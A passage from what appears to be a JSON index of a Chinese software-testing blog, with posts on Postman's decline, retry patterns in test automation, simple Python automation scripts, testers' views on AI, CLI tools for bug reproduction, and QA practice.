B功能之后，我们这种纯粹的C端用户就变成了postman商业化转型的牺牲品。我们的诉求很简单，一个符合直觉的请求调试工具，然而postman通过各种更新主动的抛弃了我们，为了取悦企业采购而牺牲了用户体验，这不是postman一家的问题，基本上大多数的企业级应用都会有一些奇怪的功能去讨好真正的金主，比如钉钉的钉一下功能。\n好在市场是自由的，我们仍然有大量的选择余地。\npostman我们不能否认其历史地位，它的创新让这一工具品类变得异常丰富，激烈的竞争也让我们用上了越来越好的产品，不过对于最终的独立用户来说，是时候跟postman渐行渐远了。\n","date":"2023-07-19T11:26:16+08:00","permalink":"zh.ethanhan.cc/p/postman%E8%B6%8A%E6%9D%A5%E8%B6%8A%E9%9A%BE%E7%94%A8%E4%BA%86/","title":"Postman越来越难用了"},{"content":"看到一篇非常好的关于在自动化测试中引入重试模式的文章，https://www.thegreenreport.blog/articles/enhancing-automation-reliability-with-retry-patterns/enhancing-automation-reliability-with-retry-patterns.html 忍不住跟大家分享一下。\n自动化测试，特别是ui自动化的稳定性提升是非常困难的，出错了就重试这个简单的策略可以帮助我们处理一些难以预料的异常情景，从而提升测试的整体稳定性。\n这篇文章的作者就分享了几种重试的设计模式，通俗易懂而且相当实用。\n动态重试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 async function dynamicRetry(actions, maxRetries) { let retryCount = 0; async function retryAction() { try { return await actions(); } catch (error) { if (retryCount \u0026lt; maxRetries) { retryCount++; return retryAction(); } else { throw error; } } } return await retryAction(); } it(\u0026#34;Testing the dynamic retry pattern\u0026#34;, async () =\u0026gt; { await demoPage.navigateToDemoPageTextBoxes(); await browser.pause(1000); await dynamicRetry(async () =\u0026gt; { await demoPage.fillFullName(\u0026#34;John Doe\u0026#34;); await demoPage.fillEmail(\u0026#34;test@gmail.com\u0026#34;); await demoPage.fillCurrentAddress(\u0026#34;test address\u0026#34;); await demoPage.clickFakeButton(); }, 3); }); 该模式的核心是设置一个最大的重试次数，每次重试过后次数加一，直到达到阈值。\n轮询重试 另一种常见的重试模式是使用超时和轮询。这种方法会重复检查一组操作是否成功完成或者是否达到了超时时间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 async function pollRetry(actions, timeout, pollInterval) { const startTime = Date.now(); let lastError; while (Date.now() - startTime \u0026lt; timeout) { try { await actions(); return; } catch (error) { lastError = error; await sleep(pollInterval); } } throw lastError; } function sleep(ms) { return new Promise((resolve) =\u0026gt; setTimeout(resolve, ms)); } it(\u0026#34;Testing the poll retry pattern\u0026#34;, async () =\u0026gt; { await demoPage.navigateToDemoPageTextBoxes(); await browser.pause(1000); await pollRetry( async () =\u0026gt; { await demoPage.fillFullName(\u0026#34;John Doe\u0026#34;); await demoPage.fillEmail(\u0026#34;test@gmail.com\u0026#34;); await demoPage.fillCurrentAddress(\u0026#34;test address\u0026#34;); await demoPage.clickFakeButton(); }, 20000, 5000 ); }); 这个模式的核心是设置一个总的超时时间，如果在这个时间段内发生了异常，那么就每隔一段时间重试一下。\nselenium的wait unitl 接口就是这种重试模式。\n异常重试 这是最常见的一种重试方式，好处是可以针对不同的异常执行不同的重试策略。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 function errorHandlingRetry(actions) { return new Promise(async (resolve, reject) =\u0026gt; { try { await actions(); resolve(); } catch (error) { if (error instanceof ElementNotFoundError) { // Handle the case when the element is not found console.error(\u0026#34;Element not found:\u0026#34;, error.elementSelector); await sleep(1000); await actions(); } else if (error instanceof TimeoutError) { // Handle the case when a timeout occurs console.error(\u0026#34;Timeout occurred:\u0026#34;, error.message); await sleep(500); await actions(); } else { // Handle other types of errors console.error(\u0026#34;An error occurred:\u0026#34;, error); } reject(error); } }); } it(\u0026#34;Testing the error handling retry pattern\u0026#34;, async () =\u0026gt; { await demoPage.navigateToDemoPageTextBoxes(); await browser.pause(1000); await errorHandlingRetry(async () =\u0026gt; { await demoPage.fillFullName(\u0026#34;John Doe\u0026#34;); await demoPage.fillEmail(\u0026#34;test@gmail.com\u0026#34;); await demoPage.fillCurrentAddress(\u0026#34;test address\u0026#34;); await demoPage.clickFakeButton(); }); }); 指数退避 指数退避是一种重试策略，其中每次尝试之间的间隔呈指数递增。这种方法有助于减轻拥塞并减少对系统的负载。以下是一个示例实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 async function retryWithExponentialBackoff(actions, maxRetries, initialDelay) { let retryCount = 0; let delay = initialDelay; while (retryCount \u0026lt; maxRetries) { try { await actions(); return; } catch (error) { console.error(\u0026#34;Error:\u0026#34;, error); } await sleep(delay); delay *= 2; retryCount++; } throw new Error( \u0026#34;Retry limit exceeded: Actions did not complete successfully.\u0026#34; ); } it(\u0026#34;Testing the retry with exponential backoff pattern\u0026#34;, async () =\u0026gt; { await demoPage.navigateToDemoPageTextBoxes(); await browser.pause(1000); await retryWithExponentialBackoff( async () =\u0026gt; { await demoPage.fillFullName(\u0026#34;John Doe\u0026#34;); await demoPage.fillEmail(\u0026#34;test@gmail.com\u0026#34;); await demoPage.fillCurrentAddress(\u0026#34;test address\u0026#34;); await demoPage.clickFakeButton(); }, 4, 1000 ); }); 其实这种方式也是设置一个最大的重试次数，不过因为增加了指数退让的关系，所以每次重试的间隔都会变长，避免短时间反复重试给被测系统造成巨大压力。\n随机间隔重试 随机间隔为重试机制增加了随机因素，可以帮助避免执行中的同步问题和模式。其实就是每次重试等待的时间是是随机的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 async function retryWithRandomizedInterval( actions, maxRetries, minDelay, maxDelay ) { let retryCount = 0; while (retryCount \u0026lt; maxRetries) { try { await actions(); return; } catch (error) { console.error(\u0026#34;Error:\u0026#34;, error); } const delay = Math.floor( Math.random() * (maxDelay - minDelay + 1) + minDelay ); await sleep(delay); retryCount++; } throw new Error( \u0026#34;Retry limit exceeded: Actions did not complete successfully.\u0026#34; ); } it(\u0026#34;Testing the retry with a randomized interval pattern\u0026#34;, async () =\u0026gt; { await demoPage.navigateToDemoPageTextBoxes(); await browser.pause(1000); await retryWithRandomizedInterval( async () =\u0026gt; { await demoPage.fillFullName(\u0026#34;John Doe\u0026#34;); await demoPage.fillEmail(\u0026#34;test@gmail.com\u0026#34;); await demoPage.fillCurrentAddress(\u0026#34;test address\u0026#34;); await demoPage.clickFakeButton(); }, 3, 1000, 3000 ); }); 总结 记住下面几种重试模式\n动态重试 异常重试 轮询重试 指数退避 ","date":"2023-07-03T12:01:01+08:00","permalink":"zh.ethanhan.cc/p/%E4%BD%BF%E7%94%A8%E9%87%8D%E8%AF%95%E6%A8%A1%E5%BC%8F%E6%9D%A5%E6%8F%90%E5%8D%87%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E7%9A%84%E7%A8%B3%E5%AE%9A%E6%80%A7/","title":"使用重试模式来提升自动化测试的稳定性"},{"content":"www.freecodecamp.org是我密切关注的免费学习编程的网站，里面不定期会有高质量且最新的各种编程以及技术教程，今天偶然在freecodecap看到一篇讲python进行日常自动化的帖子，原文在这里https://www.freecodecamp.org/news/python-automation-scripts/，觉得有点意思，顺便就把里面的内容拿出来分享和评论一下。\n自动校对 1 2 3 4 5 6 7 8 9 10 # Python Proofreading # pip install lmproof import lmproof def proofread(text): proofread = lmproof.load(\u0026#34;en\u0026#34;) correction = proofread.proofread(text) print(\u0026#34;Original: {}\u0026#34;.format(text)) print(\u0026#34;Correction: {}\u0026#34;.format(correction)) proofread(\u0026#34;Your Text\u0026#34;) 说实话，似乎用不上。\n自动随机播放音乐 1 2 3 4 5 6 7 8 9 10 import random, os music_dir = \u0026#39;E:\\\\music diretory\u0026#39; songs = os.listdir(music_dir) song = random.randint(0,len(songs)) # Prints The Song Name print(songs[song]) os.startfile(os.path.join(music_dir, songs[0])) 思路很好，不过似乎也用不上。\npdf转csv 1 2 3 4 5 6 7 import tabula filename = input(\u0026#34;Enter File Path: \u0026#34;) df = tabula.read_pdf(filename, encoding=\u0026#39;utf-8\u0026#39;, spreadsheet=True, pages=\u0026#39;1\u0026#39;) df.to_csv(\u0026#39;output.csv\u0026#39;) 需要pip install tabula，在做数据处理的时候就很有用了，因为有些站点的收据下载的格式默认就是pdf的。\n自动压缩照片 1 2 3 4 5 6 7 import PIL from PIL import Image from tkinter.filedialog import * fl=askopenfilenames() img = Image.open(fl[0]) img.save(\u0026#34;output.jpg\u0026#34;, \u0026#34;JPEG\u0026#34;, optimize = True, quality = 10) 需要安装PIL(Python Imaging Library) ，在归档的时候应该有些用处。\n自动下载YouTube视频 1 2 3 4 5 6 7 import pytube link = input(\u0026#39;Youtube Video URL\u0026#39;) video_download = pytube.Youtube(link) video_download.streams.first().download() print(\u0026#39;Video Downloaded\u0026#39;, link) 需要安装pytube，国内的话用处不大，推荐一个替代的命令行工具you-get，可以下载b站视频，有兴趣的同学可以研究一下。\n自动文本转语音 1 2 3 4 5 6 7 8 9 10 11 12 from pygame import mixer from gtts import gTTS def main(): tts = gTTS(\u0026#39;Like This Article\u0026#39;) tts.save(\u0026#39;output.mp3\u0026#39;) mixer.init() mixer.music.load(\u0026#39;output.mp3\u0026#39;) mixer.music.play() if __name__ == \u0026#34;__main__\u0026#34;: main() 这里用的是Google Text to Speech API，国内用不上。\n图片转pdf 1 2 3 4 5 6 7 8 from fpdf import FPDF Pdf = FPDF() list_of_images = [\u0026#34;wall.jpg\u0026#34;, \u0026#34;nature.jpg\u0026#34;,\u0026#34;cat.jpg\u0026#34;] for i in list_of_images: Pdf.add_page() Pdf.image(i,x,y,w,h) Pdf.output(\u0026#34;result.pdf\u0026#34;, \u0026#34;F\u0026#34;) 可以批量转，应该有用。\n抄袭检测 1 2 3 4 5 6 7 8 9 10 11 from difflib import SequenceMatcher def plagiarism_checker(f1,f2): with open(f1,errors=\u0026#34;ignore\u0026#34;) as file1,open(f2,errors=\u0026#34;ignore\u0026#34;) as file2: f1_data=file1.read() f2_data=file2.read() res=SequenceMatcher(None, f1_data, f2_data).ratio() print(f\u0026#34;These files are {res*100} % similar\u0026#34;) f1=input(\u0026#34;Enter file_1 path: \u0026#34;) f2=input(\u0026#34;Enter file_2 path: \u0026#34;) plagiarism_checker(f1, f2) 其实就是比较两个文件的相似性，不知道对中文的支持如何。\n生成短链接 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from __future__ import with_statement import contextlib try: from urllib.parse import urlencode except ImportError: from urllib import urlencode try: from urllib.request import urlopen except ImportError: from urllib2 import urlopen import sys def make_tiny(url): request_url = (\u0026#39;http://tinyurl.com/app-index.php?\u0026#39; + urlencode({\u0026#39;url\u0026#39;:url})) with contextlib.closing(urlopen(request_url)) as response: return response.read().decode(\u0026#39;utf-8\u0026#39;) def main(): for tinyurl in map(make_tiny, sys.argv[1:]): print(tinyurl) if __name__ == \u0026#39;__main__\u0026#39;: main() \u0026#39;\u0026#39;\u0026#39; -----------------------------OUTPUT------------------------ python url_shortener.py https://www.wikipedia.org/ https://tinyurl.com/bif4t9 \u0026#39;\u0026#39;\u0026#39; 调用第三方服务生成短链接，其实也可以自己写个短链接的生成服务，用flask+redis就可以了。\n网络测速 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # Internet Speed tester # pip install speedtest-cli import speedtest as st # Set Best Server server = st.Speedtest() server.get_best_server() # Test Download Speed down = server.download() down = down / 1000000 print(f\u0026#34;Download Speed: {down} Mb/s\u0026#34;) # Test Upload Speed up = server.upload() up = up / 1000000 print(f\u0026#34;Upload Speed: {up} Mb/s\u0026#34;) # Test Ping ping = server.results.ping print(f\u0026#34;Ping Speed: {ping}\u0026#34;) 这个很有用的，可以保存一下。\n总结 这些自动化脚本其实都很不错，短小精悍，属于入门级，尽管跟离提升工作效率的目的还有点距离，不过却可以很好的向初学者进行python自动化概念的展示，很不错的帖子。\n","date":"2023-07-03T11:31:49+08:00","permalink":"zh.ethanhan.cc/p/%E4%BD%A0%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84python%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/","title":"你应该知道的python自动化脚本"},{"content":"前几天看到一篇文章讨论从测试人员的角度去理解AI的，稍微翻译了一下。原文地址https://stevethedoc.wordpress.com/2023/06/18/how-should-we-view-ai-as-testers\n上周三和周四，我有幸与我的两位同事Sushmitha Sivan和Bhavana Akula一起参加了伦敦的AI峰会。在那里，我们不仅听到了一些非常有趣的关于人工智能的演讲，还有机会为黑客马拉松的参与者们进行了大约一个小时的测试和质量工程的培训，教他们如何将这些知识应用到他们所面临的挑战中。\n人工智能对我来说还是比较新的（我猜很多人也是如此），所以我们都处于学习的不同阶段，但这个学习过程非常有趣，因为它的范围和对社会的影响都是令人着迷的。\n我不会告诉你如何测试人工智能，或者如何优化数据模型等等，这方面有其他地方可以去了解。这篇文章主要是关于我从参加的不同讲座中得到的一些更普遍的学习和想法，我脑海中浮现出了一些流行词和短语（以下是随机排列的）：\n道德 法规 抵抗 未知的恐惧 失业 激发人类创造力 减轻繁琐工作 数据模型偏见 训练数据模型 负责任地使用人工智能 深度伪造 这让我思考起作为测试专业人员，我们应该如何应对人工智能。我故意使用这个词汇，因为它涵盖了测试中的每个角色。\n我们大多数人在职业生涯中都测试过用户界面、后端数据库、API等等，这些都可以生成特定的已知结果。我们有用户故事告诉我们预期的行为，以便我们可以相应地进行测试。那么对于这个新世界，我们该怎么看待呢？\n我认为人工智能的目的是增强我们人类的工具，帮助我们做出决策。计算机的思维速度比我们快得多，因此它们可以帮助我们摆脱一些乏味的工作，我们可以利用我们的大脑去做更有创造力的事情。\n当然，依赖人工智能可能会导致忽视固有的偏见，我们所做的决策可能基于有缺陷的数据。因此，我们需要谨慎对待我们对结果所放置的信任程度\n我们能相信AI工具使用的数据集吗？ 可能包含假数据吗？ 它是否包含偏见或者是偏差？ 我们是否相信输出涵盖了我们需要考虑的一切？ 结果是否受到了可能会影响的缺失参考文献的影响？ 如果机器能够替我们进行批判性思考，并且我们毫无疑问地依赖它们，我们也可能失去自己的批判性思维能力。这种情况已经发生了，一个现实世界的例子是这样的——有多少30岁以下的人能够从书上读地图？如果他们的手机或汽车导航系统出故障了，有多少年轻一代能够应对并使用地图作为备用计划？他们在科技依赖下长大，而我们这些年纪稍大一点的人则能够两者兼顾。\n作为测试人员，我们很容易陷入打开像ChatGPT这样的东西，并要求它根据我们提供的信息帮助生成测试计划或测试用例的陷阱中，然后将其用作完美答案。我们必须谨慎行事。是的，我们可能会得到一些可以开始的东西，而不是一张空白纸，但如果一直这样做，我们就会失去从头开始自己启动这个过程的能力。有时候，将事物进行思维导图有助于我们自己建立联系-我们必须训练自己从AI给我们的任何想法中开始中途进行，这可能行得通也可能不行。我并不是说这一定是件坏事，但我们需要小心，不要失去自己思考的能力。\n有一些很棒的现实场景可以利用人工智能：\n寻找最佳的抵押贷款利率并将其整理在一张表格中 为一个不熟悉的情况起草一封信件 准备主持一场测验的研究工作 准备一档广播节目（我可能会这样做） 随着我们在日常生活中开始使用人工智能，我们会越来越依赖它，它不会消失，而是需要受到监管（人类有一种令人羡慕的能力，可以将任何发明变成可以用于有害目的的东西！！），并且需要人们对其使用进行质疑。\n作为测试人员，我的建议是以适度的怀疑态度接受人工智能。质疑所得到的结果，并进行独立验证。你无法获得结果所基于的数据，因此要谨慎行事，做好测试人员最擅长的事情——深入探究、调查和提问。\n最后，保持你的批判性思维能力——在一个人们越来越依赖所听到的话作为真相的世界中，这一点将比以往任何时候都更加重要。那些能够退后一步，采取客观的方法的人将在未来脱颖而出。\n欢迎来到崭新的世界。\n谨慎的在测试过程中使用人工智能 作者的观点我是大部分赞同的，最近一直在关注AI领域，生成式AI爆发性的增长以及快速的落地应用让很多人都印象深刻。我甚至听到过一种观点：凡是现在可以被外包的工作将来都可能被ai所取代。\n但事实果真如此吗？\n首先我必须说明，我是非常看好AI在测试领域的应用的，从三体里借用一个词语，那我可能是降临派，历史的车轮滚滚向前，螳臂当车可能是不太明智的。尽管我看好未来，不过从现在这个阶段来说，把AI应用到测试工作中我们还有很多问题需要解决。\n首先值得借鉴的应用场景目前并不多。这篇推文写作的时间是2023年的年中，从目前的情况看将AI应用到测试中的案例并不多见.有一个非常有启发的例子是用AI自动进行网页上操作，不过离真正的测试活动还是有些差距的，预期结果和断言的缺失让这个想法目前还只是属于自动化的范畴。\n数据安全性。这是老生常谈的问题，目前很多的ai应用都会将数据发送到openAI的后台，这就意味着很有可能你的组织内的隐私数据或者个人的敏感信息会被openAI存在数据库中。只要是落库了，那么你就没办法避免openAI被攻击导致数据泄露，或者被openAI的员工惊鸿一瞥，这些顾虑也会导致大型的组织和公司会非常谨慎的使用AI应用。另外如果OpenAI使用你的敏感数据进行模型的训练，那么你的一些私人信息将会成为模型的内建知识，供所有人参观和品评，这可能不是是一个令人愉快的体验。\n准确性。AI会出现幻觉，也就是一本正经的胡说八道，对于一些应用来说这是没问题的，比如算命和星座预测。但对于测试来说这是不可接受的，测试要求客观性，定义的结果和实际的结果一定要尽可能的一致，然而目前这个阶段，AI在这方面的表现还是有很大的提升空间的。\n结果的一致性。我写过一些AI应用，在很多情况下我发现AI给出的结果是不一致的，相当的输入可能无法得到完全一致的输出。比如我希望ai处理完数据之后以json格式输出结果，有时候ai就是很任性的给出其他格式的输出，对一些需要规模化的应用来说，这是不可接受的，需要在工程层面做很多事情来进行纠偏。对于倾向于开发短平快的测试应用来说，这点也会拖慢我们的开发周期以及降低运行的稳定性。\n更好的模型还在路上。随着玩家的增加，更好的模型可能在路上。也许这周你需要花费很多精力去做的事情下个月就已经成为模型的内建能力了，比如现在chatgpt的plugin就是很好的例子。如果我们对模型的内在能力有更高要求的话，稍微等一等可能算是个比较现实优选方案。另外测试行为对多模态的依赖也相对较深，这方面目前的模型能力还不是特别成熟。\n最后, 欢迎来到崭新的世界。测试领域也需要探索未知，如果上面的问题对你来说不是阻碍，那么现在这个时间点就是是投入研究的最佳时期。\n","date":"2023-06-29T11:30:55+08:00","permalink":"zh.ethanhan.cc/p/%E4%BD%9C%E4%B8%BA%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E6%88%91%E4%BB%AC%E8%AF%A5%E5%A6%82%E4%BD%95%E7%9C%8B%E5%BE%85ai/","title":"作为测试人员，我们该如何看待AI"},{"content":"测试同学在很多时候都是在沟通问题，复现问题和定位问题。\n记得多年前刚入行的时候，我一直对复现问题不够重视，觉得自己是测试人员，主营业务应该是测试，复现问题应该是解决问题的人做的事情。后来尽管岗位分工越来越细，但是测试同学做的事情并没有越来越聚焦，反而整体的工作范围更加的宽泛，其实说白了就是专业性上有提升，但是专注度上的改善其实并不明显。\n复现问题其实很多时候是测试人员的痛点，比如我们在测试过程中发现了一个问题，并发给了开发同学，然而，你可能会有下面的经历\n开发人员表示在自己的环境上是好的呀，这个不讨论，各种梗太多了 开发人员表示看不懂bug上的描述，这点可以用截图和录屏来解决 开发人员表示你帮我复现一下吧，这时候就比较痛苦了，因为复现本质上就是重复 测试的时候一再的重复自己是痛苦且低效的，如果问题是用户上报的，那么除去重复之外，还要加上阅读理解的过程，阅读用户的操作过程，理解他们做了些什么，以及猜测系统或者产品的表现。稍微归纳一下，发现复现基本上都是在做下面的一些事情\n创建数据，可以是从app上，也可以是从网页上，甚至可以在admin后台去创建 收集或查询一些周边数据，比如数据库或者是被测的系统和产品上 结合数据和实际表现去判断产品或者系统的表现是不是正常 所以除了第3步之外，前2步都是非常适合用自动化脚本的方式去实现的。我就用python写了很多的辅助脚本去帮助我重现问题，下面是我的一些经验\n用直接调用api的方式去创建/查询数据 因为现在大部分产品的管理端都是前后端分离的，所以管理端是可能有纯后台的api的；以及移动端app都是有api的，调用api创建各种测试数据其实是可以实现的，只要做好鉴权工作，调api去创建和查询的实现成本和维护成本都是可控的。\n之前我是用直连数据库的方案去做查询和创建，不过后面逐渐废弃了这种做法，这是因为\n数据库表结构可能会发生变化，从而导致脚本执行失败，从而降低了脚本执行的稳定性以及提高了维护成本 脚本需要去关注分库分表的实现，增加了实现难度，降低了长期的可维护性 因为安全审计的关系，数据库的连接和密码会周期性的发生变化，增加了维护成本 我们生产环境的数据库只有生产环境的机器才能访问，本地办公网没有办法访问，所以做线上问题复现的时候，直接连数据库就会显得有心无力了 直接写数据库可能会绕过后端的数据校验，可能会写入脏数据 所以在做自动化工具的时候一般不推荐直接连数据库进行数据的生成和查询\n用爬虫的方式去查询周边数据 很多时候我们需要获取一些周边团队的数据，有时候我们可以通过api调用来获取，但也会有获取不到的情况；另外有些祖传的系统可能前后端不分离，后端并没有提供api接口，这种情况下我一般用爬虫来做数据的收集。\n爬虫的方式有很多好处，但对于一些系统来说可能存在开发难度高，运行效率低的情况，所以如果有更好的方式可以方便的拿到数据的话，爬虫的优先级可以低一点。\n用缓存去提高执行效率 收集数据，特别是收集多个页面或者是多个系统的数据往往是比较慢的，这时候可以用redis等缓存数据库来保存一下结果，这样可以加速代码的执行。这里不推荐用数据去做，因为收集数据是一项相对来说比较高频且随意的工作，数据结构一般不会特别稳定，如果表结构频繁变更的话，那么开发和维护的成本都非常高。我一般是把数据直接序列化成json字符串，然后丢到redis的sting对象里，简单方便。\n另外我的测试数据创建过程一半也是用爬虫加api的方式，缓存下来的数据可以帮助我进行更加复杂的测试数据创建工作。\n编写cli工具，让测试过程更加工程化 有一段时间我积累了相当多的python脚本，在实际工作中调用脚本就成了一门学问，一些脚本要这样调，另一些可能要在其他脚本调用后才能调用，记忆的成本很高，文档化的价值又基本没有，后来我发现使用cli工具去整合脚本调用，写好每个命令的help message，这样文档和调用编排都有了。\n比如我们一个需要经常复现的场景是用户在某个地址搜索关键词(keyword)，没有办法搜到预期结果，这时候我会使用如下的cli进行复现\n1 python reproduce_cli.py search -l=1.23456,6.54321 -k=somthing 这里-l传入的是经纬度信息。最后把返回的结果直接扔给开发就可以说明清楚问题了。\n如果不用命令行工具的话，那么复现的过程就会相对比较复杂\n打开app，设置经纬度 打开搜索页面，搜索keyword 截屏或者录屏，再把描述发给开发 可以看到命令行工具对复现问题的效率提升还是很有帮助的。对了，我一半用python的click库去写cli应用，非常好用，墙裂推荐了。\n最后 命令行工具除了提升复现问题效率之外还可以提升整体的测试效率，我是非常反对大家一上来就建立平台，发明需求，努力推广应用的。先把工具做好，大家觉得好用了，再把工具平台化，一上来就憋大招，风险其实还是比较高的。\n","date":"2023-06-01T15:03:41+08:00","permalink":"zh.ethanhan.cc/p/%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%8F%90%E9%AB%98%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87/","title":"自己编写命令行工具来提高测试效率"},{"content":"原文地址: https://medium.com/@dstekanov.tech/qa-team-as-a-fire-department-9b5abd470e44\n翻译及总结如下。\n作者是一名有十多年经验的QA工程师，作者曾经在不同的公司和项目中工作过，从小型的创业公司到大型的跨国公司，从传统的水瀑式方法到现代的敏捷方法。在这些年里，作者观察到了QA团队在软件开发过程中扮演着不同的角色和职责，有时候是成功的，有时候是失败的。作者想分享一下作者对QA团队的看法和建议，希望能对那些想要提高QA团队效率和价值的人有所帮助。\n作者喜欢用消防队来比喻QA团队。消防队是一个重要的组织，它可以在紧急情况下保护人们和财产免受火灾的危害。消防队员需要具备以下几个特点：\n快速反应：消防队员需要能够在第一时间到达火灾现场，并迅速采取措施控制火势。 高效协作：消防队员需要能够和其他消防队员以及其他救援人员密切合作，共同完成救援任务。 专业技能：消防队员需要掌握各种消防设备和技术，以及如何应对不同类型和规模的火灾。 持续学习：消防队员需要不断地更新自己的知识和技能，以适应不断变化的环境和需求。 类似地，QA团队也是一个重要的组织，它可以在软件开发过程中保证产品的质量和性能。QA工程师也需要具备以下几个特点：\n快速反馈：QA工程师需要能够在第一时间发现并报告产品中存在的问题，并提供有效的解决方案。 高效沟通：QA工程师需要能够和开发工程师以及其他利益相关者密切沟通，共享信息和反馈。 专业技能：QA工程师需要掌握各种测试工具和技术，以及如何针对不同类型和规模的产品进行测试。 持续学习：QA工程师需要不断地更新自己的知识和技能，以适应不断变化的环境和需求。 基于这个比喻，作者想给出以下几点建议，来帮助QA团队更好地发挥自己的作用和价值\nQA团队应该和开发团队紧密合作，共享信息和反馈，而不是互相指责或隔离。这样可以提高沟通效率，减少误解和冲突，提升产品质量。作者举例说，他曾经在一个项目中，QA团队和开发团队使用同一个工具来管理问题和需求，这样可以及时地交流和解决问题，避免了重复工作和延误。 QA团队应该使用自动化测试工具，提高测试效率和覆盖率，而不是依赖人工测试或过时的方法。这样可以节省时间和资源，发现更多的问题，提高测试质量。作者举例说，他曾经在一个项目中，QA团队使用了自动化测试框架来执行回归测试，这样可以在短时间内完成大量的测试用例，而不需要人工干预。 QA团队应该关注用户的需求和体验，而不是只关注技术细节或功能。这样可以更好地满足用户的期望，增加用户的满意度，提高产品价值。作者举例说，他曾经在一个项目中，QA团队使用了用户故事来定义测试场景，这样可以从用户的角度来验证产品的功能和性能，而不是只从技术的角度来检查。 QA团队应该持续地学习和改进，跟上行业的发展和变化，而不是停滞不前或满足现状。这样可以提高自身的能力和知识，适应不同的环境和需求，保持竞争力和创新力。作者举例说，他曾经在一个项目中，QA团队使用了敏捷方法来进行测试活动，这样可以灵活地调整测试计划和策略，根据实际情况来优化测试过程。 作者最后总结说，QA团队是一个重要的角色，它可以帮助产品成功地上市和运行，但是它也需要不断地适应和创新，才能保持竞争力和价值。\n","date":"2023-05-06T15:37:18+08:00","permalink":"zh.ethanhan.cc/p/qa%E8%A6%81%E5%83%8F%E6%B6%88%E9%98%B2%E9%98%9F%E4%B8%80%E6%A0%B7/","title":"QA要像消防队一样"},{"content":"原文地址: https://medium.com/@peterdtitan/designing-for-failure-in-software-development-and-testing-9f3f2d0bbd7b\n在软件开发和测试中为失败而设计\n软件开发是一个复杂的过程，涉及到许多不同的技术、工具、方法和人员。在这个过程中，失败是不可避免的，甚至是必要的，因为它可以帮助我们发现错误、改进质量和提高效率。然而，并不是所有的失败都是有益的，有些失败可能会导致严重的后果，如数据丢失、系统崩溃、客户不满或法律责任。因此，我们需要在软件开发和测试中为失败而设计，即预见可能发生的失败情况，并采取相应的措施来防止、检测、恢复和学习。\n为失败而设计的原则 为失败而设计并不意味着我们要故意制造失败，而是要在开发过程中考虑到失败的可能性，并采用一些原则来应对它们。以下是一些常见的为失败而设计的原则：\n容错：容错是指让系统能够在出现错误时继续正常运行，而不是崩溃或停止工作。容错可以通过多种方式实现，如使用异常处理、重试机制、备份系统、冗余组件等。 隔离：隔离是指将系统分割成不同的模块或服务，使得一个模块或服务的失败不会影响其他模块或服务的正常运行。隔离可以通过多种方式实现，如使用微服务架构、消息队列、断路器模式等。 降级：降级是指当系统无法提供完整的功能或性能时，能够提供一些基本的或替代的功能或性能，以满足用户的最低需求。降级可以通过多种方式实现，如使用缓存、静态页面、功能开关等。 监控：监控是指收集和分析系统的运行状态、性能指标、错误日志等信息，以便及时发现和解决问题。监控可以通过多种方式实现，如使用日志系统、度量系统、报警系统等。 反馈：反馈是指向用户或开发者提供有关系统状态或问题的信息，以便他们能够做出适当的响应或改进。反馈可以通过多种方式实现，如使用用户界面、通知系统、报告系统等。 为失败而设计的好处 为失败而设计可以带来许多好处，如：\n提高系统的可用性和可靠性：通过容错、隔离和降级等手段，可以使系统在出现错误时仍能保持运行，从而减少停机时间和损失。 提高系统的可扩展性和可维护性：通过隔离和监控等手段，可以使系统更容易分布式部署和管理，从而适应不同的负载和环境。 提高用户和开发者的满意度和信任度：通过监控和反馈等手段，可以使用户和开发者更清楚地了解系统的状态和问题，并及时得到解决方案或建议。 为失败而设计的挑战 为失败而设计也有一些挑战，比如增加系统的复杂度和成本：为了实现容错、隔离、降级等功能，需要增加额外的代码、配置、测试和部署\n","date":"2023-05-06T15:22:47+08:00","permalink":"zh.ethanhan.cc/p/%E5%9C%A8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%92%8C%E6%B5%8B%E8%AF%95%E4%B8%AD%E4%B8%BA%E5%A4%B1%E8%B4%A5%E8%80%8C%E8%AE%BE%E8%AE%A1/","title":"在软件开发和测试中为失败而设计"},{"content":"原文地址: https://www.stickyminds.com/article/exploratory-testing-why-it-not-ideal-agile-projects\n下面是gpt4的总结。\n探索性测试是一种灵活的测试方法，它不需要预先定义测试用例，而是让测试人员根据自己的判断和发现来设计和执行测试。探索性测试有以下优点：\n它可以适应需求不明确或变化频繁的场景，提供及时的反馈和建议。 它可以发挥测试人员的创造力和直觉，发现一些预期之外的缺陷或风险。 它可以节省测试文档的编写和维护的时间和成本，提高测试效率。 然而，在敏捷软件开发中，探索性测试并不是最佳选择。原因有以下几点：\n探索性测试缺乏可追溯性和可重复性，难以评估测试覆盖率和质量。它也不利于与其他团队成员或利益相关者分享测试结果和经验。 探索性测试依赖于测试人员的经验和技能，可能导致测试结果不一致或遗漏重要的缺陷。它也不利于培养新手测试人员或提高团队的测试能力。 探索性测试不利于自动化和持续集成，无法实现敏捷开发的快速反馈和交付。它也不利于与开发人员协作，实现测试驱动开发或行为驱动开发等敏捷实践。 